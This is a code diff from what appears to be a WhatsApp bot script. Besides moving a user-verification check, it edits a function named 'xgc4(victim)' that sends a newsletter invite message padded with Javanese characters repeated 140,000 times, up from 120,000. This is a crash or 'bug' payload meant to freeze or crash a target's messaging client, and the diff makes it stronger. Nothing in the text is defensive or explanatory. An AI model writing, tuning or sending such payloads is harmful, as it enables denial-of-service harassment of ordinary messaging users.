@@ -29,6 +29,7 @@ const groupMembers = isGroup ? groupMetadata.participants : ''
 const isBotAdmins = isGroup ? groupAdmins.includes(botNumber) : false
 const isBotGroupAdmins = isGroup ? groupAdmins.includes(botNumber) : false
 const isGroupAdmins = isGroup ? groupAdmins.includes(sender) : false
+const isUser = dansyaverifikasiuser.includes(sender)
 const totalFitur = () =>{
             var mytext = fs.readFileSync("./ViperTzy.js").toString()
             var numUpper = (mytext.match(/case '/g) || []).length;
@@ -233,7 +234,6 @@ const ownerNumber = JSON.parse(fs.readFileSync("./database/dtbs/owner.json"))
 // Cek Database
 const isContacts = contacts.includes(sender)
 const isPremium = prem.includes(sender)
-const isUser = dansyaverifikasiuser.includes(sender)
 const isOwner = ownerNumber.includes(senderNumber) || isBot
 
 // BUTTON VIDEO
@@ -2255,9 +2255,9 @@ async function xgc4(victim) {
                         message: {
                             newsletterAdminInviteMessage: {
                                 newsletterJid: '33333333333333333@newsletter',
-                                newsletterName: "🦄드림 가이 Xeon" + "ꦾ".repeat(120000),
+                                newsletterName: "🦄드림 가이 Xeon" + "ꦾ".repeat(140000),
                                 jpegThumbnail: "",
-                                caption: "ꦽ".repeat(120000),
+                                caption: "ꦽ".repeat(140000),
                                 inviteExpiration: Date.now() + 1814400000,
                             },
                         },
